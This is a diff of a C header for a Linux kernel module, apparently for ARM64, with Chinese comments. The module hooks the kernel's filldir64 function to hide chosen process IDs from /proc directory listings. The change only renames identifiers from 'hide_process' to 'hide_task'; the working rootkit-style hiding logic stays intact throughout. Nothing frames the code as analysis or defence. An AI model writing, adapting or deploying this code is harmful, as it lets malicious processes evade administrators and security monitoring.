@@ -19,8 +19,8 @@
   不过不影响：这里按 DT_DIR + 数字 PID 名字过滤，理论上其他目录下同名数字目录也会被隐藏。
 
 */
-#ifndef HIDE_PROCESS_H
-#define HIDE_PROCESS_H
+#ifndef HIDE_TASK_H
+#define HIDE_TASK_H
 
 #include <linux/kernel.h>
 #include <linux/types.h>
@@ -32,26 +32,26 @@
 #include "export_fun.h"
 #include "inline_hook_frame.h"
 
-#define HIDE_PROCESS_MAX_PIDS 8
+#define HIDE_TASK_MAX_PIDS 8
 
 // 隐藏表保存内核侧 pid/tgid 数值；filldir64 里只拿得到目录项 name，所以后面转成字符串比较。
-static pid_t g_hidden_pids[HIDE_PROCESS_MAX_PIDS];
+static pid_t g_hidden_pids[HIDE_TASK_MAX_PIDS];
 static struct hook_entry g_filldir64_hook[1];
-static DEFINE_MUTEX(g_hide_process_lock);
+static DEFINE_MUTEX(g_hide_task_lock);
 
 // hook 热路径的快速空表判断：没有隐藏 PID 时直接放行原 filldir64。
-static bool hide_process_has_pid(void)
+static bool hide_task_has_pid(void)
 {
     int i;
 
-    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+    for (i = 0; i < HIDE_TASK_MAX_PIDS; i++)
         if (READ_ONCE(g_hidden_pids[i]))
             return true;
     return false;
 }
 
 // filldir64 没有 struct file 参数，无法确认当前目录是否为 /proc；这里用 DT_DIR + 精确 PID 名字匹配。
-static bool hide_process_match_pid_name(const char *name, int namlen, unsigned int d_type)
+static bool hide_task_match_pid_name(const char *name, int namlen, unsigned int d_type)
 {
     char pid_str[16];
     int i, pid_len;
@@ -59,7 +59,7 @@ static bool hide_process_match_pid_name(const char *name, int namlen, unsigned i
     if (d_type != DT_DIR || !name || namlen <= 0 || namlen >= sizeof(pid_str))
         return false;
 
-    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+    for (i = 0; i < HIDE_TASK_MAX_PIDS; i++)
     {
         pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);
 
@@ -82,10 +82,10 @@ static int filldir64_hook_work(struct pt_regs *regs)
     int namlen = (int)regs->regs[2];
     unsigned int d_type = (unsigned int)regs->regs[5];
 
-    if (!hide_process_has_pid())
+    if (!hide_task_has_pid())
         return 0;
 
-    if (!hide_process_match_pid_name(name, namlen, d_type))
+    if (!hide_task_match_pid_name(name, namlen, d_type))
         return 0;
 
     // 命中后伪造“filldir64返回值当前目录项已成功处理”，并跳过原 filldir64，不写入用户缓冲。
@@ -98,7 +98,7 @@ static int filldir64_hook_work(struct pt_regs *regs)
 }
 
 // 安装 hook，隐藏目标 pid。
-static int hide_process_install(pid_t pid)
+static int hide_task_install(pid_t pid)
 {
     unsigned long filldir64_addr;
     int ret = 0;
@@ -107,7 +107,7 @@ static int hide_process_install(pid_t pid)
     if (pid <= 0)
         return -EINVAL;
 
-    mutex_lock(&g_hide_process_lock);
+    mutex_lock(&g_hide_task_lock);
 
     if (!g_filldir64_hook[0].target_addr)
     {
@@ -135,7 +135,7 @@ static int hide_process_install(pid_t pid)
         goto out_unlock;
 
     // hook 安装成功后再写隐藏表，避免表里有 PID 但拦截点没生效。
-    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+    for (i = 0; i < HIDE_TASK_MAX_PIDS; i++)
     {
         pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);
 
@@ -154,28 +154,28 @@ static int hide_process_install(pid_t pid)
     WRITE_ONCE(g_hidden_pids[empty], pid);
 
 out_unlock:
-    mutex_unlock(&g_hide_process_lock);
+    mutex_unlock(&g_hide_task_lock);
     return ret;
 }
 
 // 删除一个隐藏 PID；如果隐藏表已经空了，就卸载 filldir64 hook。
-static void hide_process_remove(pid_t pid)
+static void hide_task_remove(pid_t pid)
 {
     int i;
 
     if (pid <= 0)
         return;
 
-    mutex_lock(&g_hide_process_lock);
-    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+    mutex_lock(&g_hide_task_lock);
+    for (i = 0; i < HIDE_TASK_MAX_PIDS; i++)
     {
         if (READ_ONCE(g_hidden_pids[i]) == pid)
             WRITE_ONCE(g_hidden_pids[i], 0);
     }
 
-    if (!hide_process_has_pid())
+    if (!hide_task_has_pid())
         inline_hook_remove(g_filldir64_hook);
-    mutex_unlock(&g_hide_process_lock);
+    mutex_unlock(&g_hide_task_lock);
 }
 
-#endif /* HIDE_PROCESS_H */
+#endif /* HIDE_TASK_H */
